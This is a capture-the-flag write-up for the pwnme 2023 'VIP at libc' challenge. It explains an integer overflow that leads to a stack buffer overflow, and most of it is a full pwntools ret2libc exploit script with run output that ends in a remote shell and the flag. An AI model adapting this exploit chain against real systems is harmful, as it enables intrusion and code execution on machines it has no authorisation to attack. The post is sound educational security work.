---
title: "[pwnme 2023] vip"
date: 2023-05-07
tags: ["ctf", "nasm", "pwn", "linux", "pwnme"]
---

## VIP at libc

> Sooo I heard that if you were VIP, you could access some specific features!
> Maybe one of those features can be used to get inside their system?
> 
> **INFO** : *This challenge need to spawn an instance, you can connect to it with netcat: nc IP PORT*
> 
> Author: Zerotistic#0001
>
> Remote service at : nc 51.254.39.184 1335

VIP at libc is a basic stack based buffer overflow challenge. To trigger the large buffer overflow in the `access_lounge` function, we have to trigger the int overflow within the `buy_ticket` function. Then it is a classic ret2libc exploit, first we leak the address of `puts` by calling `puts(&puts@got)`, then we return to the `main` function. Finally we call `system("/bin/sh")` by triggering the bof the same way.

## Final exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import os
import time
import pwn

BINARY = "vip_at_libc"
LIBC = "/home/nasm/Documents/pwn/pwnme/vip/libc.so.6"
LD = "/home/nasm/Documents/pwn/pwnme/vip/ld-linux-x86-64.so.2"

# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF(BINARY)
libc = pwn.ELF(LIBC)
ld = pwn.ELF(LD)
pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32
p16 = pwn.p16
u16 = pwn.u16
p8  = pwn.p8
u8  = pwn.u8

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
source ~/Downloads/pwndbg/gdbinit.py
'''.format(**locals())

def exp():

    io = start()

    io.sendlineafter(b"Your username: ", b"nasm")
    io.sendlineafter(b"> \n", b"2")
    io.sendlineafter(b"> \n", b"3")
    io.sendlineafter(b"> \n", b"-99999")
    io.sendlineafter(b"> \n", b"3")
    io.sendlineafter(b"> \n", b"1")
    io.sendlineafter(b"> \n", b"4")

    rop = pwn.ROP(exe)
    rop.call('puts', [exe.got.puts])
    rop.call('main')

    io.sendlineafter(b"> ", b"4"*0x18 + rop.chain())

    io.recvuntil(b"want.\n\n\n")
    libc.address = pwn.unpack(io.recvline().replace(b"\n", b"").ljust(8, b"\x00")) - 0x58ed0 - 0x28000
    pwn.log.info(f"libc: {hex(libc.address)}")

    io.sendlineafter(b"Your username: ", b"nasm")
    io.sendlineafter(b"> \n", b"2")
    io.sendlineafter(b"> \n", b"3")
    io.sendlineafter(b"> \n", b"-99999")
    io.sendlineafter(b"> \n", b"3")
    io.sendlineafter(b"> \n", b"1")
    io.sendlineafter(b"> \n", b"4")

    rop_libc = pwn.ROP(libc)
    rop_libc.call('system', [next(libc.search(b"/bin/sh\x00"))])

    print(rop_libc.dump())

    io.sendlineafter(b"> ", b"4"*0x18 + pwn.p64(rop.ret.address) + rop_libc.chain())

    io.interactive()

if __name__ == "__main__":
    exp()

"""
nasm@off:~/Documents/pwn/pwnme/vip$ python3 exploit.py REMOTE HOST=51.254.39.184 PORT=1335
[*] '/home/nasm/Documents/pwn/pwnme/vip/vip_at_libc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'/home/nasm/Documents/pwn/pwnme/vip'
[*] '/home/nasm/Documents/pwn/pwnme/vip/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/nasm/Documents/pwn/pwnme/vip/ld-linux-x86-64.so.2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 51.254.39.184 on port 1335: Done
[*] Loaded 6 cached gadgets for 'vip_at_libc'
[*] libc: 0x7fdf08902000
[*] Loaded 218 cached gadgets for '/home/nasm/Documents/pwn/pwnme/vip/libc.so.6'
0x0000:   0x7fdf0892c3e5 pop rdi; ret
0x0008:   0x7fdf08ada698 [arg0] rdi = 140595900032664
0x0010:   0x7fdf08952d60 system
[*] Switching to interactive mode

Your lounge 444444444444444444444444\x1a@ has been created!
You can access it whenever you want.


$ cat flag.txt
PWNME{OOO0h_yoU_4re_V1P_4ND_g0t_sh3LL_w1th_LIBC??!!_S0_strong!!!e5b2cf}
"""
```